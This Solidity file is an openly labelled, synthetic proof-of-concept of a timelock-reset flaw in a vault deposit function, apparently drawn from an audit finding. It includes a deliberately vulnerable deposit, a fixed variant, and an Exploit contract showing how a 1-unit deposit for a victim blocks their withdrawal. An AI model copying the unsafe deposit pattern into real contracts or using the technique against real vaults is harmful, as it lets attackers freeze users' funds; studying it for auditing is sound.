// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Vaultka Water.deposit (Zokyo, Aug 2023, finding #44897).
    SYNTHETIC, cheatcode-free. deposit always rewrites userTimelock[receiver]
    (@> VULN). A 1-unit deposit for the victim pushes a matured unlock out by
    lockTime. The victim's 1000 stays in the vault. withdraw reverts.
    depositFixed leaves an already-mature timelock alone. */

contract Asset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Water {
    Asset public immutable token;
    uint256 public constant lockTime = 30 days;
    mapping(address => uint256) public assets;
    mapping(address => uint256) public userTimelock;

    constructor(Asset token_) {
        token = token_;
    }

    function seedMatured(address user, uint256 amount) external {
        assets[user] = amount;
        userTimelock[user] = block.timestamp;
    }

    function deposit(uint256 amount, address receiver) external {
        token.transferFrom(msg.sender, address(this), amount);
        assets[receiver] += amount;
        // @> VULN: depositing for receiver resets their unlock to now + lockTime.
        userTimelock[receiver] = block.timestamp + lockTime;
    }

    function depositFixed(uint256 amount, address receiver) external {
        token.transferFrom(msg.sender, address(this), amount);
        assets[receiver] += amount;
        if (userTimelock[receiver] == 0) {
            userTimelock[receiver] = block.timestamp + lockTime;
        }
    }

    function withdraw(uint256 amount) external {
        require(block.timestamp >= userTimelock[msg.sender], "locked");
        assets[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }
}

contract Depositor {
    function withdraw(Water water, uint256 amount) external {
        water.withdraw(amount);
    }
}

contract Exploit {
    Asset public token; // nonce 1
    Water public water; // nonce 2
    Depositor public victim; // nonce 3

    constructor() {
        token = new Asset();
        water = new Water(token);
        victim = new Depositor();
    }

    function run() external {
        token.mint(address(water), 1000);
        water.seedMatured(address(victim), 1000);
        require(water.userTimelock(address(victim)) == block.timestamp, "unlock is now");
        require(water.assets(address(victim)) == 1000, "victim has 1000");
        token.mint(address(this), 1);
        token.approve(address(water), 1);
        water.deposit(1, address(victim));
        require(water.userTimelock(address(victim)) == block.timestamp + 30 days, "lock reset");
        (bool ok,) = address(victim).call(abi.encodeWithSelector(victim.withdraw.selector, water, uint256(1000)));
        require(!ok, "withdraw reverts");
        require(water.assets(address(victim)) == 1001, "1000 plus dust still inside");
        require(token.balanceOf(address(victim)) == 0, "victim received 0");
    }
}
